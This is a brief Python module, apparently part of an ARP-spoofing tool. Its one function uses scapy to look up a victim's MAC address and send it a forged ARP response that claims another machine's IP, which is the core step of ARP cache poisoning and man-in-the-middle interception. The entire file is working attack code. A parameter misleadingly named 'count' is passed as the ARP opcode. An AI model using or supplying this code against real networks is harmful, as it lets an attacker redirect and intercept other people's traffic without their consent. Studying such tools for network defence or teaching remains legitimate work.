import scapy.all as scapy
from controller.getMac import get_mac


# Send an ARP RESPONSE to a victim
#   target_ip : IP of the machine that the ARP response will be sent to
#   spoof_ip  : IP that it will fake to be
def send_packet(tip, sip, count:int=2):
    """
    :param tip: target ip
    :param sip: spoof ip
    :return:
    """
    # op = 1(request) 2(response)
    # pdst = IP address of the target machine
    # hwdst = MAC of the target machine
    # psrc = IP of the source machine (attacker will fake another machine)
    tmac = get_mac(tip) # target mac
    packet = scapy.ARP(op=count, pdst=tip, hwdst=tmac, psrc=sip)
    scapy.send(packet, verbose=False)